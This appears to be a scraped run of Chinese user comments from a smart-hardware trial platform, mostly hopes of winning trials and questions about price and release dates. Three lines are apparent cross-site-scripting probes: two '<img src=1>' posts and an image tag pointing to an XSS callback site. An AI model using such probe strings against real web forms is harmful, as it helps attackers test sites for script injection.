等待测试，手机导航用的是高德导航，呵呵，还挺般配的
好希望有个智能手环呀！！！！！！！！！！！！！！！！！！！！！！！
怎么还不赶紧上市，等不及了我可要买其他的了 
一个没有多大技术含量的产品迟迟不能上市，是不是管理上出问题了
定位精度室内30米室外5米是不是有点近？
太贵了，。
     我也认为很贵 这么高的价格可以买烤箱和其他电子产品了
有没有天气的相关数据啊？
难产啊 !由于上市价格定不下来,损益啊!估计上市价格要500-600rmb
内部精英人士
希望、期待能成功试用 ！！！！！！！！！！
试用可以就买一个来玩玩。。
就没成功试用过
我也想要一个。
没有视频演示下  29元到不贵
不错....
续航能力 怎么样
我倒是担心这么小巧的防丢卫士会丢掉...  
期待。。。。
创意不错，我很期待。
....这个问题    家里要再多的电 也比汽油便宜好吗？ 不然有什么意义？
这个问题真是经典。。。。。。在自己家里要多少电来充。。。。我喷了     难道比汽油的油费还贵？  一度电才多少钱？  一升油多少钱？
就是啊 那么强大的东东 特想要
强大啊！MY GOD！赐予我力量！
手机系统要4.3以上，有限制，是在高德地图软件使用不是高德导航使用，不太明白。
不是太贵的情况下，，可以考虑购买
比我厉害,可以试试使用auto cad软件对使用环境进行绘图,这样做会更加直观的出现你所需要的效果.
好厉害  好新奇 太有创意了 好想要 
为什么没有显示图片呢？
有问题应该请厂商解决下..
嗯，要是有白色或金色也许会更好看
期待更多跟进评测
原来的苹果手机掉了，就换成了天语的，但是像素。。。。。。能拍成这样我觉得都是超水平了。
嘿嘿、、、、 
荣耀立方已经上市
很期待 能有一个  
这么强大，是真的吗，我期待。
一张在淘宝买32$，太贵了吧？！
淘宝买32美元 http://item.taobao.com/item.htm?spm=a230r.1.0.0.ip4lji&amp;id=39236750989
淘宝一张卖189元 http://item.taobao.com/item.htm?spm=a230r.1.0.0.ip4lji&amp;id=39236750989
很好呢，很期待！
我在奇酷网申请了好多产品，没一个能申请到的，这会不会是在骗消费者和坑消费者的？
我和你一样，但是我还是得到过三次。所以我非常相信奇酷还是很有良心的。
这个很不错，解决了只能手环的部分问题，可携带性也非常好，无论是手还是其他地方，全都可以绑上。蓝牙4.0解决了部分手机没有NFC的缺陷，前景不错。
希望能够成功
   很不错。  如果这东西 价钱 便宜点 销售量会很高 我很期待  
这评测报告，简直精彩的不像话！
我好想体验一把啊，希望这次能够成功
貌似前几张拍照背景下面是卷寿司的吧    哈哈~~
后盖可以插在尾巴上，就不怕丢失了。
可不可以加上求救功能？毕竟在户外运动很可能受伤。
很不错，大致看完，LZ很有心，支持下！！！！
介绍的不太详细，没看懂到底是干嘛的。。。
我爱333333666666000000
真不错，支持楼主
哈哈~这样又得去摸索多个软件，咱还是大众点，大家看得懂就好吧，谢谢支持
谢谢支持~
民以食为天，背景太...了，支持支持
就是导航，，，，
支持一下，多提点建议就好了
支持一下 。。。。。
不错，应该是要再接再厉
支持...支持...
感觉就是一热熔胶枪。。
太好了  我是个电子迷    太喜欢了  
好喜欢的说
好想要啊》》》》》加油吗
就是个遥控器？？
照片拍的很不错
有了祂,我可能会超越时間的束縛
加油奇酷科技，支持奇酷科技。
创意很好，实用性更强，很期待。价格？？？？
哈哈哈 奇酷科技~~有创意！！
这么说这个还是很不错滴~~
希望能让我知道每晚睡眠质量到底怎样，了解身体的情况、无声闹钟让我起床不用惊醒身边人、能只提醒自己按时吃饭和下班（我是工作狂，这里上班时间不规律，以前定手机闹钟还被老板说）、提醒我运动量是否足够、不用总是为忘了给手环充电导致第二天不能用、装B神器，摆脱屌丝形象、尽情的挥洒汗水不用担心内部电路短路，洗澡都带着
在哪可以买一个
这个和我在展会上看到的enocean 开关很像啊 不过样子太难看了 我估计价钱不低 做好了发出来让大家试用下
图片赞一个
come on  给我一个吧
我也要一个，什么时候开始
送你一个，求认识，你好!
什么时候发货啊，酷币兑换的。说推后两个星期，现在快3个星期了。心急。。。
我想问塑料瓶很环保？现在地球越来越糟糕了，如果再这样下去，地球会把我们亲手解决。
外观有待提高。
笑而不语，表示“什么品牌”如何定义？
这个不错，有免费体验吗？期待阿！
呵呵900-1200RMB，感觉不太值得，眼睛是不是疲劳了自己知道。还需要提醒吗？
鸡肋产品。。。
表示价格太高了。
太贵了。真正的果粉从来不会戴套。
约合人民币10890元，蛮便宜的，期待！
申请加入测试！出行的利器，生活的必备！
筛选通过。什么时候有结果？？很期待！
今天要揭晓了哦，希望自己是那50个幸运儿之一哦，小小的祈祷一下！
自驾游必备哦，好期待呢。
好，有创意，等待产品上市。
理念不错哦，呼吸的顺畅和连续程度，吸入和呼出的空气量的比率可以揭示人体的压力和注意力情况。而应用则会在收集数据分析之后，提醒人们深呼吸以释放压力。
很喜欢这样的智能表，内敛，期待性能的表现!
加微信吧（qikoo360）,结果会在官方微信公布
估计以后加油站 要设置一个充电站了！！  要有充电和太阳能一起 就牛B了
恩，期待啊
什么时候可以申请？
希望能中吧！！！
评价非常到位,体验很用心哦！
感觉很神奇的样子
筛选通过。什么时候有结果？？很期待！  好想要一个啊  加油奇酷科技，支持奇酷科技   
你的头像很有型
倒计时开始。。。。
感觉是一个不错的小智能硬件
感觉是一个不错的智能小硬件
经典，有趣
看起来不错，希望能快点上市！
我在奇酷网申请了好多产品，没一个能申请到的。前几次我的手机不支持。这次我的手机支持，希望这次能申请到。
什么时候有WP版啊
后续会很快开发WP版本的！谢谢关注和您的支持！
有效距离是多远？ 
看宣传应该是周三开始了。
希望我能中一次啊
儿童卫士2发售时间预计7月初，发售时间暂定京东~
相当于家庭医生，很不错的宝贝。
申请好多次,这次希望可以申请到呀~阿门！好木有信心呀~不过希望这个智能表真的很好呀~很是喜欢。
像素太低了。1300万的话就好啦。希望改进！持续关注着。 
不能防水不好，温度40度以下，看来是不能直接丢车里了
dwfdyx中签了
什么时候可以买到，这才是最重要的。
能给个上市时间吗？等着给孩子用，
用手机拍或者用相机拍一些图片，只要用心肯定能写的很出色的。
我表示我已经提交申请，第一次申请，看看有木有希望！！！
喜欢，觉得很方便。
看来小编终于对我的头像感兴趣了，呵呵呵，谢谢，中选喽！！！
如果能和游戏头盔配套使&#039;用那就是神来之笔了.哈哈😄
看上去不错.是大众货吗
一直在申请 从未被选中 求中
Android4.3 以上才在系统层面统一了蓝牙BLE的接口，没办法呀
第一次申请 中了一个 就买十个！
唉——，又没中，希望下次运气能好一点，话说怎样才能中嘛
顶顶，不错的哦，收到了立马就体验的哦。 大概啥时候能到呢。。。
期待ing... 什么时候出呢？
让我也体验下这么洋气的东西
国货当自强，！！！中国企业，好样的！！！中国人，顶起！！！
修改了 欢迎批评啊
相互学习 我刚修改
最后几张好  基情啊 哈哈 
期待能成功申请
其实身边很多做私企的朋友都是三十多岁，有车有房，日子还算滋润。对一些行业里的老大哥玩的东西提不起兴趣，对一些二十啷当岁小青年玩的东西又觉得幼稚。。。真希望公司能多研发一些类似的小玩意儿。既新潮又实用。把妹也杠杠的。哈哈。
哇哦~~帅~~
介绍那里写着内存 512kb 是不是错误啊？
可以买一个，放车里。开车时戴着，可以把我那个车载DVR给淘汰掉了~~
外观上还有改进的空间
按1.5万日元，大概八九百块人民币。物流公司估计不会考虑给司机人手一个。私家车车主应该是主要消费人群。。。。五百块左右，我考虑入手。开车出事的太多了。我现在最多也是跑5、6个小时就强制自己休息下。
我在某个网站上见过类似的东东。有点意思。。。
这个。。。呵呵。。
太假了，伤不起啊
预计售价在三千块以下，应该会爆卖啊。。。动辄八千一万，杂牌也要六七千，，，市场就被局限掉了呢
不是说99么
幸运儿诞生啦，鼓掌！期待试用报告出炉，但愿下次自己也有机会哦。
清晰度的一个问题，在运动的情况得到稳定清晰的图像
其实这类OBD的产品都很鸡肋，能读取的信息也都是无关紧要的，或者书上车都能看到，并不能实现远程开关车门，启动车辆打开空调等，读取的那些个故障又不能解决，依然需要4S店或者修理厂。
😖😖😖😖😖😖😖😖😖😖啊啊啊啊啊啊啊！   这次幸运之神一定要眷顾我，，，好几次都没中，，，，，，
扔水里了。。。太残忍了。
哈哈哈~第一张太搞笑了~
喜欢 希望能申请成功    希望好几回了
哈哈。。不扔就不是bong我也扔了。。。我扔瓶里
哈哈。。。。我那是海洋之星。。抗深压
蛋定。。那是我的女神的合影
不入深水，焉知防水真假
我非常喜欢，就是不知道价格会不会一样喜欢呀！！
强在内心，胜在算法。这个总结的非常好。
haha  这是用PPT做的？
全做成图了的报告啊。很赞。非常用心啊。
比较期待，喜欢这样的外观，高端大气
顶起啊！！！！！！！！！！！！
酷！感觉离我们屌丝太遥远，是高富帅的又一泡妞利器！
不错。。我申请了！！！作为试用用户，希望在体验中，给予你们更多的建议
第一次申请.很期待啊！
这个产品不错，希望能中签、、、
太假了吧  每次都不中 
求中啊，馅饼也砸我一次我不嫌疼啊
希望自己也能人品不好一次，呵呵，。支持。 已经申请，。 祝福越来越好！
3L水啊，有没有浪费？写得很梦境啊。
求中啊，求人品大爆发！！！
啊啊啊啊啊啊啊！ 幸运之神一定要眷顾我
精简，明了。特别是图片制作排版方面，让人看得非常舒服。小编是下了很大一翻功夫啊。这真是一篇专业行评测。随便给小编提下建议，拍防水那张图片可以放在透明器械内加上点蓝色墨水，镜头直接贴在上面拍，可能效果更美。
Ps做的，给个精品报告吧哈哈
很累一上午
我想用透明玻璃杯，没找到
使用8421法显示时间...相信这是一个伟大的壮举
512KB好像小了点
哦？ 很期待什么时候有呢？ 这样再也不用担心我的东西坏掉了 
不知道他的距离可以有多远？刚刚打错字了，应该是掉了
还是我们有共同语言啊，哈哈
很高兴，我被选中了！以后还会继续关注360产品！
好像还行吧4万美元
看了详情突然很想买。希望能得到。
怀着不中的心态打开，出乎意料激动万分，小编终于抽中我了！
感觉后面会是一篇图片并茂的高手文摘
可以直接花钱买。好像是限量的。可以先预约。然后等待京东售卖。
申请好多次了，希望这次能中！！！
自从知道了360奇酷这个智能硬件体验平台，一直在支持，这期终于中了 ，幸运，高兴！后面会努力完成试用报告，继续关注360！
10秒钟的录音实际用处不大，建议改为电话监听模式，即家长可以拨打儿童手表的号码，手表自动接听，不会发出任何声音，而家长就可以听到现场的声音了。这样监听的时间长短就可以由家长机子掌握了
求中，只为传播，智能概念~！
40度？搞了吧，夏天车里都可以煮鸡蛋！
现代人的生活需要它。
求人品大爆发
很期待！希望可以实现!
没有花园，只有菜园、、、
宣传图做的好有feel
diy好期待，我喜欢
价格才是硬道理
再夸一下宣传图做的很棒，有未来感。mention的图标很简洁，我喜欢。
这个建议要顶
好可惜了，又没有我
终于中了，支持关注360.
很期待！希望可以实现! 
希望中一次 
很期待！希望可以实现!
功能很强大~求中啊~~
😖😖😖😖😖😖😖😖😖😖啊啊啊啊啊啊啊！ 这次幸运之神一定要眷顾我，，，好几次都没中，，，，，， 
我也是好开心，经过几次失望，奇酷终于不负我，开心，我会认真写报告的~~也会继续支持奇酷，支持360~
这次的好喜欢啊~抽不到就去买了~希望还是抽中~~~~
第一次抽希望可以抽中，好喜欢
很时尚，喜欢！
这个有可能中么- -
期待好运~~
写的好棒 加油！！支持你
大神写得好经典！！佩服
这一次我一定要中啊。期待上天的期望啊。。。。。。。。如果一直不中的话。我都不相信qikoo网站了。老天你一定要眷顾眷顾我啊。。。。。。祈祷中。。。。。。。。。。。。。。。。。qikoo我相信你。。。。如果我不中的话谁还会相信qikoo网站啊。。
繁体字看上去有些吃力，想法不错。
还没中！！！呜呜呜呜呜呜呜呜呜~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
很漂亮  我偶很喜欢
这期居然中奖的男的比女的还多。
9494~~~~~~~
爽，不给点惊喜表示一下？
为了这智能手环串了个号。如果真的能让我筛选通过的话，那我会更关注这个网站。但是如果抽不中，也只能怪我自己人品太差吧。
貌似很不错的
自从与“360奇酷”这个智能硬件体验平台相识以来，一直在支持，这期终于中了！非常感谢！我会努力完成试用报告，并继续关注360！  “360奇酷”比你更懂你！
谢谢哈！！
为了这智能手环串了个号。如果真的能让我筛选通过的话，那我会更关注这个网站。但是如果抽不中，也只能怪我自己人品太差吧。
功能不错，以后好评如潮可以考虑购买一对情侣的！很酷感觉
从来不相信这样的好事能降临到我头上，每次都是抱着重在参与的态度来参加，所以从来不会有失望与遗憾！如果这样的中奖几率能青睐我，我会很珍惜得之不易的东西，并且让更多的人认识它，应用它！
.。。。。。。。。。。。。。。。。。。。。。。。。/.......................
期待....
want it！！
如过中了 好用的话 多买几个
直接插在手机耳机孔，安装相应APP，对准阳光即可。
需要下载UVindeSir的软件，插在耳机孔，对准当前阳光即可得到数值，然后输入自身的皮肤指数和常用防晒霜指数，它会根据设定的数值给予你防晒时间提示。
目前价格是80~90元
机会太渺小了
要是中了的话，报告怎么写啊？
从来不相信这样的好事能降临到我头上，每次都是抱着重在参与的态度来参加，所以从来不会有失望与遗憾！如果这样的中奖几率能青睐我，我会很珍惜得之不易的东西，并且让更多的人认识它，应用它！ 
太可爱了，期待拥有。解觉我大部分需求。
真的好想买一个
每次都是预约结束，到底什么时候有货啊？
很期待，高大上，带上瞬间有品位！！！
从来不相信这样的好事能降临到我头上，每次都是抱着重在参与的态度来参加，所以从来不会有失望与遗憾！如果这样的中奖几率能青睐我，我会很珍惜得之不易的东西，并且让更多的人认识它，应用它！
很喜欢，能得到就太好了
真的很喜欢，求RP爆发
真的是一见倾心啊
要是能中就好了，貌似几率很小吧
感觉很实用，但是太贵了，性价比不高，那800块就买这几个功能的智能环不划算，希望价格在100到200左右这个环对于学生学习效率个人觉得很有用。
希望人品大爆发啊！
我想了解的是 我这人就喜欢喝碳酸饮料，是否总提示我不健康呢，那将是件多么糟糕的事情！
在官网看过，很不错，可以到官网留下邮箱
气气，这次又没中，可恶
在等孩子都长大了
好赞！但是能不能专门放一个app的图啊。。看得有点吃力。。。
好像要，就是好贵，不知道好不好用 
#酷品评论#第一次申请奇酷产品，凭着用心的答题，真心的互动和必胜的信念，果然在7月7日11点显示筛选成功！感谢奇酷给我这次中奖的机会！“360奇酷”谁与争酷！
人品啊，爆发吧！这里只有三十个，人数太多了     
尝试一下，希望可以
要是能中一个就好啦~~~~~~送给男朋友~~。让他给我买一个~~哈哈
一直申请 从未中过 这次也不抱希望
好棒的排版，你为了这一次排版肯定做很多工作吧！下次如果我被抽到希望我也能像这样。    
一直申请，从未中过，这次也不抱希望。 发现申请程序有漏洞，竟然能申请2次同一个项目？虽然不一定中，但毕竟是漏洞哦。有图有真相。小编不让我中我就告发你哈！奸笑......
试用要开始了 不错
求试用！！！！！！！！！
我想试用，我想躺床上看电影
只能说希望能被选中吧 不要抱太大的希望 重在参与 
好可爱吖  啥时候上市啊
重在希望。
貌似很不错呀
申请了那么多期都没中 闷
擦擦擦 没中奖
这个真不错，已经申请试用了，希望能中。
电击~~~要习惯了电击怎么办？
这次又没中 继续吧
很喜欢 希望可以免费试用 提出意见 改良不足
中一个呗。。。么么哒~
好产品郝创意好科技
喜欢  能得到就好了
不明觉厉啊~
超级可爱，期待新体验
同从未中过
为什么不换成 3.0接口
支持！加油！
嗯！还有好多精彩内容呢！不容错过哦！
这么幸运啊。看来是奇酷小编把你选了出来。期待你的精彩报告。
亲。你也有很多期没中吗？
好吧，我看不懂它是做什么的。
这个可行。但是应该会很费电啊。
价格？很期待
希望能中啊。很不错的东西
你们能加个机械操作手吗？这样就能隔着防盗网把巧克力送到她手心了。这样多好、多罗曼蒂克！！
好吧，是设计的倒退吗？没有新东西可想了
请问预约的今年是否能拿到产品？
从未中过 。。
我也有点没看懂。
。。。。。
是的，是的
非常感谢您的建议，我们chost最大负重是1公斤。
会不会漏电的啊？
有效距离是多远？  
今年八月份就可以陆续发货了，你就可以拿到您心爱的产品哦。亲！
没中。。。。。 
怎么联系你 求QQ
怎么联系你 求QQ
这东西好是好，几率就。。。。。。。
不中就不中，申请是必须的！
写得相当的巴适啊     呵呵
我之前做的就差不多那样的，图片太多烦着心烦
嗯嗯 会改进！谢谢建议
这才是智能手表，而不是那些戴不出门的玩具样手表。
好的；非常棒
好的；非常棒
很好的产品哦
怎么感觉这个东西像泡沫做的。很容易就碎掉了。
电击提醒。。。。。。。
拭目以待~~
就是说，你给它插上什么模块，它就是什么设备。那它实际上就是————————一根数据线，一根无线的数据线
貌似不错，希望能中！
非常棒的产品，期待试用
现在七月八号了，再过1个多月，孩子们报了名，上了学，这东东产品还不出来，少了多少市场机会
再过2天就七月中旬了
重在参与.
报告写的不错~
看着相当不错
天气预报都不准 ，你能准？
小巧玲珑功能强大，如果在和钥匙保护套结合起来更好了。
唉，没选中！
very good！！求神拜佛都要拥有~~
淘宝上一堆啊
拭目以待，你值得拥有！！！
很棒啊！期待能够参加试用！
看起来它的展示意义更大于功能
被”养成的爱运动的习惯!适合自虐人士使用哦。
拭目以待，运动检测绝对是个好东西!
内置1GHz双核Cortex-A9处理器、1GB RAM+4GB ROM、2.5英寸 5400转1TB硬盘，运行定制的Linux系统。最有特色的部分来自于它的扩展形式，这样看来无愧“多媒体中心”之称！
很有小资情调的蓝牙扬声器哦，一方面可以让烛光晚餐更有情调，另一方面也适合驴友户外露营使用。很不错的创意，期待量产呢！
智能手表的竞争真的很激烈啊！让人应接不暇 !
我能有一个就好了。。。
看起来和蛋似的，很疑惑能有蛋用…… 智能硬件不是这么入手的，建议你们招聘个新的产品经理吧。
一定要中，如果中了，我就每天给你们点赞，我发誓，但是如果中不到我会生气，还要隔几天才赞一次
不好中啊，老天保佑
想要一个，太酷了
外观漂亮，配在我的白色小2上面一定很好看
这对话很有意思嘛
是不是说，她必须依附于手机，手机状态如何，她就如何，辐射情况怎么样？如果24小时带着，对身体会不会有影响，如果有这方面的数据，相信很多人会很乐于尝试
真心期待！
申请了好多期，没有一次中的，我再试一次
一定给俺试用一个啦。 为了安卓4.3，准备换手机了。 
写的很专业啊！
对于我的windows phone应用会更好
对于我的windows phone应用会更好吗？？？
谢谢夸奖！
一定会提交优质的试用报告！
&lt;img src=1&gt;
&lt;img src=1&gt;
[img]http://xss.re/api-4167.jpg[/img]
应该把手环扔水杯里照一张照片。
希望会中，如果中了一定会提交优质的试用报告的！ 
关键你得先有辆车。。。。
和我在国展上见的差不多，估计就是一个产品。
期待期待，一定好好交作业
什么时候能买到，你们不是要挣钱的吗？只能看不能买你怎么挣钱啊，广告吗
这个多少钱在哪里看货买车？？？
希望能中奖，这智能手环太酷了。
好像还没有看明白到底是什么意思，希望能入手好好研究一下。。
朋友已经更新
炫酷的外形，实用的性能，是***了装13炫富把妹秀优越各种功能啊啊啊！不入手就太亏了！！！！！
为了这智能手环串了个号。如果真的能让我筛选通过的话，那我会更关注这个网站。但是如果抽不中，也只能怪我自己人品太差吧
点击貌似有点不妥吧~~
很好，后期努力
我想说 这有神马用···唉
使用后已定好好研究一下 
只能看不能买= =简直了
写的好用心啊。就是图上的绿字颜色有些模糊。
别评论了，回家喝西北风去。
我将会好好使用它的，即使自己掏腰包。
是人都会好不好
非常期待！
好期待能中
 一定会提交优质的试用报告！
 一定会提交优质的试用报告！
 一定会提交优质的试用报告！
希望能中奖，这智能手环太酷了
就他妈知道叫不知道买 
响智手环好下来了都去买吧
怎样可以提高申请中奖率啊？
真是高端大气上档次，低调奢华有内涵。 真的很想拥有
这也题太太太太少了吧。。。。。。。。。。。。。。人家万字大论。。。。。。。。你居然只写几个字。。。。。。。。。iflyou。。。。。。。。。。。。。。。。。。居然还可以算过关的使用报告。。。。。。。。。。。
 已提交申请，希望能选中，很想试用.
誓要成为试用达人，申请了几次，这次终于得中，还没收到，期待中……先感谢一下所有的TV。
已提交申请 外观很炫  希望看看功能！！
想要，让我在我的暑假瘦成一道闪电吧
坑爹呢！肯定第一批出现了不可修复的重大问题，要不然怎么会这么长时间都不出第二批了！
拜托，请务必让我中奖！
三星出手环的时候羡慕了好久，可惜价格不便宜最重要的的是手机型号不对，忧伤啊，希望可以获得试用机会~
太好了，我真想拥有啊 
今天是2014年07月09日，期待的高德导航地图小蜜，应该首发面试市场了吧？--哈哈--
正在排队。
这个好多地方用得着，有些人不懂完了。
期待中，相信我的坚持，会得到收获的
...... 
早期用苹果系统内的高德地图还是花了50多元购买的，现在免费了一直在用高德，每次开车出远门都是高德为我导航，很好用，也一直在用 ，希望这次能提前使用此高科技产品……
介个东西，概率好小，三百个么差不多
虽然几率很渺茫，但是我们这些忠死党是不会放弃的！！！加油！！！希望能抽中哦。
开车的时候別在衣服上 当身姿矫正提醒器更好了
太牛B了。。这件武器。。
不是说今天可以开始申请，怎么还是“即将开启”
好东西，值得期待
真的很想拥有 希望能中！！！
虽然几率渺茫，但希望能中！！！ 
去去去排队啊你
有吗今天上午
写的9.9，然后还有运费6元
电……自虐！
申请多次怎样才能中啊 
我想说这是中国，不是美国，一天24小时蓝牙-加位置定位，这要让本来就缩水还昂贵的要命的 网费再次涨身价吗？
而且弱弱的问一下   不间断的蓝牙辐射真的对身体木有一点影响？上网和定位冒失也会加大手机辐射来着，长期不间断使用真的不会--- ---
我每次都是很认真的填写资料，写创意，每次都没我。店家，我会填写一份详细的适用报告的。
希望能中啊。。
很不错啊，又将是一大发明
个性小 性能强大不错 希望能中 亲 求抽中
沙发，看功能还是挺不错的！
什么时候开始啊，几点啊 
、 咨询一个问题，红外或者射频的话需要视距控制，RM2放在客厅里的话，怎么控制卧室的电视机或者浴室的热水器呢？ 
何时开始！？？？？
坑B，JD涨价了。
几点开始呢 ?
？？？？？几点啊 
怎么还不开始
几点开始嗷嗷嗷
这个小蜜貌似不大。
搞什么啊！根本就不能兑换
从10:00等到11:00，一直显示“已兑完”···骗人啊····
中了！！！还没有电话通知，不知道什么时候能发过来，期待ing···
已经开始了。
爱丢东西的人（我）太期待啦！
体积小，功能全，充电便捷，全方位防水……每一条都是想要的啊！真心希望能中！
外观OK，是正常的手表样子
我去  这玩意 好邪恶啊  
这东西好用啊，赶紧搞个来！！！
喜欢，很漂亮，
纯洁的我 浮想联翩 
不错，外观科技感很强！
这是第几次申请了.....一次都没中  太可怜了.. 
這個太有用了
这个真心很不错的呢!!
造型很好看
实用性很强，创意好。
支持高德地图，从塞班到现在一直都在使用
好吧 不过你提前泄密随3的信息，这个是很保密的
看样子不错哦 
功能很强大很方便我很喜欢阿
申请成功无法分享到微博，莫非是我的网络问题！不过，太中意小蜜了，超喜欢
很期待....
有了它，自驾游再也不怕迷路了，赞一个
外壳可以换成钨钢，增加抗摔功能
这个功能太全面了，好样的！支持 
看上去貌似挺好滴，挺酷滴
我是前几天第一次发现奇酷网的，看到如此小巧却功能强大的智能手环，真的好想要一个啊！第一次提交了传说中的试用申请。每天都来看一下，人数越来越多呀，希望很渺茫呢，但依旧希望能中。。嘿。。。
停电的时候音响有电手机没电。
我曾经测试过iHealth的AM3腕表运动记录仪，也用烂过几个手环。对于这款产品由于在这里只看到了图片，感觉外观不错，全密闭设计是个亮点，我预计以后手机也会做成全密闭，取消耳机、数据、充电接口，扬声器也采用新技术，听筒可以采用接触骨传导。这款腕表此举就有创新另外再加上无线充电超长待机，引领了一代新技术的潮流，非常不错！
没车是不是就不能用
希望能够中签，有了它，再也不会在停车场找不到车了，呵呵……
贵在坚持，还有对智能硬件的热爱。
我怎么没法申请
好东西值得拥有
估计会让失望，智能双向寻找有距离限制的，估计不会超过30米。
喜欢  好喜欢 希望可以中！~
可以挂在钥匙，钱包上（方便寻找），也可以声控拍照。
小蜜不错，不过放在方向盘中间是很危险的事，很多车那个位置是放置气囊的，这要是弹出来，小蜜就变炮弹了，直击面部，后果不堪设想。。。。
什么叫声控拍照
其实应该是一个很小的产品  ~~ 实现一些小小的功能~~ 跟高德本身还是挺搭的，感觉拍照和找寻的功能对一般人更实用啊
有了它，自驾游再也不怕迷路了，赞一个。中不到就去买一个，希望能中一次~
人家想试用哟，爱你哟，雪地裸跪求试用呢~~~
听起来不错，我也很想抢一个，希望能抢到！！！
只想拥有。想体验一下新品。
第一次听说这个产品，我觉得比苹果的iWatch还要强大！！！我也很需要一个，毕竟现代社会很需要一些高科技产品，用来方便我们的生活！
不知道真是产品是否有宣传的这么好
目前这块产品还是比较多的，但是最关键的是优化客户体验，提高客户黏着度。
外观很精美，尝试用一下试试看。
外观精美，功能强大，正需要一个这样的产品，希望能试用成功
挺好。可以体验一下。
听起来不错，我也很想抢一个，希望能抢到！！！  恭谢！
我知道我美那么好命啦不过还是想碰碰运气
不错挺好，希望使用能成功。
希望能体验一下小蜜的优越功能，为我们以后自驾游导航。赞
好,,好期待 
不错的想法，外观看起来还是很精致的，希望试用申请能成功！）
希望能够送一个，好好摆弄一次啊
强大的“孙悟空”，真的好期待！
已经申请了，希望能真正体验一下。
呀呀呀，真强大，好期待
期待Arrow智能手表，赞~
小小只  应该比较方便  
对于这种预计时间早已麻木了，太坑爹了。只炒作，不售货。等不起，呀，已经先给孩子买了别的，虽贵点但有现货呀
看着是不错 不知道能否真正体验一下
希望拥有一款
申请了很多次了，没有一次成功。但愿这次能行
申请很多次了，本人开车，希望这次能申请成功
申请了，希望能体验一下
期待，期待，非常期待
3D打印早就知道了，只是没想到做了这么小，的确方便快捷，当然大神大多DIY高手。。。
好期待哦，希望能申请到。先谢了。
申请并通过
~~~~(&gt;_&lt;)~~~~ 我也好想要一个，手机上的app总是会被自动关掉，没这个方便，考虑买一个(*^__^*) 嘻嘻……
申请了，希望可以成功。
高德出品，必属精品
很好，要做最好的智能穿戴！
全力支持 强烈申请
防丢和自拍，美女必备神器，期待。
有导航功能，对于我这个路痴来说迫切需要啊，我要申请
不知道宣传与实际是否相符呀
盼来盼去，产品八月初就可以面市了，大家可以加企鹅群：贰伍柒零留意柒伍扒，一起关注。据说关注有礼
好期待哦，希望能申请到真正体验一下。先谢了
已申请哦.....
不错的构想，什么时候能实现呀，期待
全能的神啊，，求您赐予我小蜜吧......感谢思密达....
这是真的吗？好想体验一下下！
太帅了，太帅了，羡慕
一直很喜欢高德，也一直用高德，期待收货中。
已申请了，很期待！希望能真正体验到小蜜带给我的放便和防护，谢谢！
申请了申请了，帮爸爸申请的，用了我的名字！以为我非常支持的！
当然功能多固然好，但是价格也很重要！多少钱？？
手机上一直在用高德地图跟高德导航，是出行必备。但是有个疑问两个软件为什么不整合在一起，这样就不用更新两次地图而且也比较方便。这款小蜜的双向找寻智能防丢很不错，可以绑在手机或者钱包上，要是能够过在小点就更不错了，已申请，希望能够成功。
太帅了，喜欢 ，最好能申请成功
我来也  小蜜比给我吧
保佑保佑  天灵灵 地灵灵  中！！！必中！
太巴适了！太想有一个！ 
很早就期待  能有这样的手表     希望早日上市   期待中。。。。。。。。。。
已经申请，希望可以得到。谢谢
我想说 很期待吗 就是太贵
真不错，手机一直用的高德导航。
我卡，这末酷，希望早点上市，功能多点，价格便宜点
这个东西不错啊，价格能接受的话考虑买个给宝贝
可以放他家厕所
隔空取物？
求成功啊！
怎么从未申请成功~~~
呜呜，这么帅，这么强，我也想要啊我擦
期待求一个。好用我会推广给朋友/
经常要使用这设备，希望能申请成功。
对了！申请时忘记说了，希望增加倾斜手环自动亮屏功能，像卡西欧的电子表一样，而且耗电量几乎可以忽略！
路过看风景
想申请一个，希望能成功！！！
很喜欢哈，已经申请了，希望希望
高德地图小蜜覆盖全国多少个城市？
造型不错，镜头是不是可以拆呢？
我手机一直用高德地图，从2010年就开始了，那时候高德地图的离线地图好大（相比较手机小内存而言），高德小蜜，名字很俗，已经申请了，希望能过哦
我申请时是62个城市，我选择了62个城市，已经提交了。现在变成80个城市，看看我提交的申请，8.实时路况，尽在掌握。目前，高德地图小蜜覆盖全国多少个城市？这个选项里，我是空的没有选，怎么办？
我也申请了，希望能成功
期待中.....
好用吗这东西？看看
很强大的功能，求人品爆发。一直期待有类似的产品出现，现在终于出现了。期望配合我的高德地图并且给我的贵重物品加个“锁”
可惜下架了
吃货的福音
免费给？ ？？？
其他的OBD我都有过试用，不知道这个能为我们带来什么 ...   期待
很喜欢这个的，希望这次能抽中我哦。很有用，很有用
原先的数据有误，现在更换了，只要大家选择B都是对的啦~~
原先的数据有误，现在更换了，只要大家选择B都是对的啦~~
真不错，期待。
高德做了数据更新，所以原先的数据，现在更换了，只要大家选择B都是对的啦~~ 
功能很强大，完全是我想要的。。。希望不要太贵
功能很喜欢！感觉以后更加方便了！希望抽中我能亲身体验一下~~~~
功能很喜欢！感觉以后更加方便了！希望抽中我能亲身体验一下~~~~
看着就喜欢，真希望中签啊，我会帮忙宣传的
好用！！！！！！！！
坚持不中。year
ips。。。
不错，可以入手个~~
功能很诱人啊，不知道价格能不能再下去一些呢。感觉七八百的样子都是很贵了。
好多空气净化，空气检测概念的产品啊。
贵是硬伤。
有兴趣入手。不知道价格怎样。
太巴适了！太想有一个！ 
太巴适了！太想有一个！ 
希望能拿到试用版
看看运气怎么样
真的很好啊  很希望有一个！
.。。。。。。求好运 求中
希望能抽中我啊！！！来吧来吧
有兴趣，价位亲民点哦 
有点多此一举
我好喜欢，给我一个呗
怎么这么赞，求一个来用用啊！
求好运~~~
期待使用，无限期待
好运来。。。。。。。。。。。。。。
没有车，暂时不申请了！
轻便智能两大卖点
奇酷写成奇库了 
打开快递，里面包括bong手环的盒子以及奇库免费体验评测的聘书
有错别字啊 
求相亲,和小蜜...
看上去挺牛掰的
挺好的，很好的闹钟
我类个去啊
太想拥有一个，赞！
产品不错。
外形不错，挺酷的
非常有兴趣买，最好功能多点，
也就减少了布线的麻烦，不知道这个使用寿命有多少次？价格几何？相对于布线成本来说哪个更合算呢
随3是什么？硬件？
希望能抽中我，如果抽中了我一定会好好写报告的
功能很强大哟，期待中。
如果抽中了我一定会好好写报告的
相亲了。。求相亲了。小蜜小蜜。。。我要小蜜。。
期待中      没有运气就买吧    支持科技
我的360智键为什么会错乱，本来是想加速的但会出现减小手机声音，而且在玩游戏的时候根本不能加速，反应也比较迟缓 
